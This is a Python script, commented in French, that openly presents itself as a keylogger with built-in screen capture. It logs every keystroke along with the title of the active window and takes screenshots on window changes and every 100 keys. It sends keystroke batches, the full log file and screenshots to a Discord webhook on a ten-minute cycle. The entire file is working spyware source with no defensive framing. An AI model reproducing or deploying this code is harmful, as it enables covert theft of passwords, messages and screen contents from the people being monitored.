# Ceci est un keylogger avec capture d’écran intégrée.
# This is a keylogger with integrated screen capture.

import keyboard
import datetime
import time
import threading
import os
import json
import requests
from pynput.keyboard import Key, Listener

# Configuration
LOG_FILE = "keylog.txt"
SCREENSHOT_DIR = "screenshots"
UPDATE_INTERVAL = 600  # en secondes (10 minutes)
DISCORD_WEBHOOK_URL = "YOUR WEBHOOK"  # À remplacer par votre URL

# Créer le dossier pour les captures d'écran si nécessaire
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Variables globales
current_window = ""
key_count = 0
start_time = datetime.datetime.now()
key_buffer = ""
buffer_size = 100  # Nombre de caractères avant envoi

def get_current_window():
    """Obtenir le titre de la fenêtre active (nécessite installation de pywin32 sur Windows)"""
    try:
        import win32gui
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Fenêtre inconnue"

def take_screenshot():
    """Prendre une capture d'écran"""
    try:
        from PIL import ImageGrab
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{SCREENSHOT_DIR}/screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        return filename
    except Exception as e:
        log_to_file(f"Erreur lors de la capture d'écran: {str(e)}")
        return None

def log_to_file(text):
    """Enregistrer du texte dans le fichier journal"""
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def send_to_discord(content, file_path=None):
    """Envoyer un message sur Discord via webhook"""
    try:
        payload = {"content": content}
        
        if file_path and os.path.exists(file_path):
            # Si c'est un fichier texte, on l'envoie comme contenu
            if file_path.endswith('.txt'):
                with open(file_path, 'r', encoding='utf-8') as f:
                    text_content = f.read()
                    # Limiter la taille pour éviter les erreurs Discord
                    if len(text_content) > 1900:
                        text_content = text_content[-1900:] + "... (contenu tronqué)"
                    payload["content"] += f"\n```\n{text_content}\n```"
                requests.post(DISCORD_WEBHOOK_URL, json=payload)
            else:
                # Pour les images
                with open(file_path, 'rb') as f:
                    files = {'file': (os.path.basename(file_path), f)}
                    requests.post(DISCORD_WEBHOOK_URL, data={"content": content}, files=files)
        else:
            requests.post(DISCORD_WEBHOOK_URL, json=payload)
        
        log_to_file(f"\n[{datetime.datetime.now()}] Message envoyé à Discord")
        return True
    except Exception as e:
        log_to_file(f"\n[{datetime.datetime.now()}] Erreur lors de l'envoi à Discord: {str(e)}")
        return False

def on_press(key):
    """Fonction appelée à chaque pression de touche"""
    global current_window, key_count, key_buffer
    
    # Vérifier si la fenêtre active a changé
    new_window = get_current_window()
    if new_window != current_window:
        current_window = new_window
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        window_message = f"\n[{timestamp}] Fenêtre: {current_window}\n{'-' * 50}"
        log_to_file(window_message)
        key_buffer += window_message + "\n"
        
        # Prendre une capture d'écran lors du changement de fenêtre
        screenshot_file = take_screenshot()
        if screenshot_file:
            log_to_file(f"[Capture d'écran: {screenshot_file}]")
            send_to_discord(f"Nouvelle fenêtre détectée: {current_window}", screenshot_file)
    
    # Enregistrer la touche
    try:
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        key_text = str(key).replace("'", "")
        
        # Formatage spécial pour certaines touches
        if hasattr(key, 'char') and key.char:
            key_text = key.char
        elif key == Key.space:
            key_text = " "
        elif key == Key.enter:
            key_text = "\n"
        elif key == Key.tab:
            key_text = "\t"
        elif key == Key.backspace:
            key_text = "[BACKSPACE]"
        
        log_entry = f"[{timestamp}] {key_text}"
        log_to_file(log_entry)
        key_buffer += key_text
        key_count += 1
        
        # Envoyer le buffer s'il atteint la taille maximale
        if len(key_buffer) >= buffer_size:
            send_to_discord(f"Nouvelles saisies de clavier ({datetime.datetime.now().strftime('%H:%M:%S')}):\n```\n{key_buffer[-1900:] if len(key_buffer) > 1900 else key_buffer}\n```")
            key_buffer = ""  # Réinitialiser le buffer
        
        # Prendre une capture d'écran tous les 100 appuis de touche
        if key_count % 100 == 0:
            screenshot_file = take_screenshot()
            if screenshot_file:
                send_to_discord(f"Capture d'écran après {key_count} touches:", screenshot_file)
            
    except Exception as e:
        log_to_file(f"[ERREUR] {str(e)}")

def send_periodic_updates():
    """Fonction pour envoyer périodiquement des mises à jour à Discord"""
    while True:
        time.sleep(UPDATE_INTERVAL)
        
        # Envoyer un résumé
        duration = datetime.datetime.now() - start_time
        message = f"**Rapport périodique du keylogger:**\n"
        message += f"• Démarrage: {start_time.strftime('%Y-%m-%d %H:%M:%S')}\n"
        message += f"• En cours depuis: {str(duration).split('.')[0]}\n"
        message += f"• Touches enregistrées: {key_count}"
        
        send_to_discord(message)
        
        # Envoyer le fichier de log complet
        if os.path.exists(LOG_FILE):
            send_to_discord("Fichier journal complet:", LOG_FILE)
        
        # Envoyer la dernière capture d'écran
        screenshots = [f for f in os.listdir(SCREENSHOT_DIR) if f.endswith('.png')]
        if screenshots:
            latest_screenshot = max(screenshots, key=lambda x: os.path.getmtime(os.path.join(SCREENSHOT_DIR, x)))
            send_to_discord("Dernière capture d'écran:", os.path.join(SCREENSHOT_DIR, latest_screenshot))

# Démarrer le thread d'envoi périodique
update_thread = threading.Thread(target=send_periodic_updates, daemon=True)
update_thread.start()

# Message de démarrage
print(f"Keylogger avancé démarré à {start_time}")
print(f"Les touches sont enregistrées dans {LOG_FILE}")
print(f"Les captures d'écran sont enregistrées dans {SCREENSHOT_DIR}")
print(f"Les mises à jour sont envoyées via Discord toutes les {UPDATE_INTERVAL // 60} minutes")
print("Appuyez sur Ctrl+C pour arrêter")

# Informer Discord du démarrage
send_to_discord(f"🔴 **Keylogger démarré** à {start_time.strftime('%Y-%m-%d %H:%M:%S')}")

# Démarrer l'écoute du clavier
with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger arrêté par l'utilisateur")
        # Envoyer un dernier rapport
        send_to_discord(f"⚠️ **Keylogger arrêté** à {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                       f"Total des touches enregistrées: {key_count}")